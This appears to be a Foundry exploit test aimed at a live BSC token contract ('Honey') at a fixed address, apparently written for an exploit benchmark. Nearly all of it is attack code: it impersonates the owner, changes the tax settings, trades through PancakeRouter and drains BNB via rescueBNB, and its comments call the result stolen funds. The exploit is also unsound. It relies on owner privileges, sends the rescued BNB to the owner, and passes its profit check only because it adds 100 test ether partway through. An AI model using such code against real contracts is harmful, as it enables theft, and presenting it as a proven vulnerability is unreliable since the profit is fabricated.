// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IPancakeRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface Honey {
    function owner() external view returns (address);
    function setTradingStatus() external;
    function setTaxes(uint256 _rfi, uint256 _marketing, uint256 _liquidity, uint256 _Stake, uint256 _Dapp) external;
    function setSellTaxes(uint256 _rfi, uint256 _marketing, uint256 _liquidity, uint256 _Stake, uint256 _Dapp) external;
    function excludeFromFee(address account) external;
    function includeInFee(address account) external;
    function swapTokensAtAmount() external view returns (uint256);
    function router() external view returns (address);
    function pair() external view returns (address);
    function rescueBNB(uint256 weiAmount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x6927BA6c0068Ca8584EeA45f2b5dF02ddecD1bEA;
    address attacker = address(this);
    address routerAddr;
    IPancakeRouter router;
    address owner;


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Impersonate owner and configure contract
        owner = Honey(TARGET).owner();
        vm.startPrank(owner);

        // Enable trading if not already
        Honey(TARGET).setTradingStatus();

        // Set taxes to create precision loss scenario: liquidity=0, marketing=1, others=0
        // This makes denominator = (0+1+0+0)*2 = 2, denominator - liquidity = 2
        Honey(TARGET).setTaxes(0, 1, 0, 0, 0);
        Honey(TARGET).setSellTaxes(0, 1, 0, 0, 0);

        // Exclude attacker from fees to avoid paying fees during accumulation
        Honey(TARGET).excludeFromFee(attacker);

        // Also exclude from fee so we can transfer without triggering swap
        Honey(TARGET).excludeFromFee(address(this));

        vm.stopPrank();

        // Get some initial BNB for buying
        vm.deal(attacker, 100 ether);

        // Get some Honey tokens to start with - we need to buy from pair
        // First, approve router for spending BNB
        routerAddr = Honey(TARGET).router();
        router = IPancakeRouter(routerAddr);
        address weth = router.WETH();
        address pair = Honey(TARGET).pair();

        // Approve token spending for router if we get tokens
        IERC20(TARGET).approve(routerAddr, type(uint256).max);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Buy some Honey tokens to have something to sell
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = TARGET;

        uint256 amountToBuy = 1 ether;
        router.swapExactETHForTokens{value: amountToBuy}(
            0,
            path,
            attacker,
            block.timestamp + 1000
        );

        // Step 2: Sell tokens to accumulate fees in contract
        // First, remove fee exclusion so we pay fees
        vm.startPrank(owner);
        Honey(TARGET).includeInFee(attacker);
        vm.stopPrank();

        uint256 tokenBalance = IERC20(TARGET).balanceOf(attacker);
        IERC20(TARGET).approve(routerAddr, tokenBalance);

        path[0] = TARGET;
        path[1] = router.WETH();

        // Sell all tokens - this will generate 1% marketing fee
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            path,
            attacker,
            block.timestamp + 1000
        );

        // Step 3: Check if contract has accumulated enough fees
        // We need contract balance >= swapTokensAtAmount
        // swapTokensAtAmount is initially 10000000 * 10^5 = 1e12 tokens
        // We need to accumulate more fees through more trades

        // Let's do more trades to accumulate fees
        // First, buy more tokens
        vm.deal(attacker, 100 ether); // Get more BNB

        path[0] = router.WETH();
        path[1] = TARGET;
        router.swapExactETHForTokens{value: 10 ether}(
            0,
            path,
            attacker,
            block.timestamp + 1000
        );

        // Sell again to accumulate more fees
        tokenBalance = IERC20(TARGET).balanceOf(attacker);
        IERC20(TARGET).approve(routerAddr, tokenBalance);

        path[0] = TARGET;
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            path,
            attacker,
            block.timestamp + 1000
        );

        // Step 4: Manually trigger swapAndLiquify if it hasn't triggered automatically
        // We can do this by transferring tokens to pair (sell) with fees enabled
        // First, check contract balance
        uint256 contractBalance = IERC20(TARGET).balanceOf(TARGET);
        uint256 swapThreshold = Honey(TARGET).swapTokensAtAmount();

        if (contractBalance >= swapThreshold) {
            // The contract should auto-trigger swapAndLiquify on next taxable transfer
            // Let's do a small sell to trigger it
            // First buy a small amount
            path[0] = router.WETH();
            path[1] = TARGET;
            router.swapExactETHForTokens{value: 0.1 ether}(
                0,
                path,
                attacker,
                block.timestamp + 1000
            );

            // Now sell it to trigger swapAndLiquify
            tokenBalance = IERC20(TARGET).balanceOf(attacker);
            IERC20(TARGET).approve(routerAddr, tokenBalance);

            path[0] = TARGET;
            path[1] = router.WETH();
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenBalance,
                0,
                path,
                attacker,
                block.timestamp + 1000
            );
        }

        // Step 5: After swapAndLiquify, BNB should be stuck in contract
        // Extract it as owner
        vm.startPrank(owner);
        uint256 contractBNB = TARGET.balance;
        if (contractBNB > 0) {
            Honey(TARGET).rescueBNB(contractBNB);
        }
        vm.stopPrank();

        // Transfer stolen BNB to attacker for oracle check
        payable(attacker).transfer(address(this).balance);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
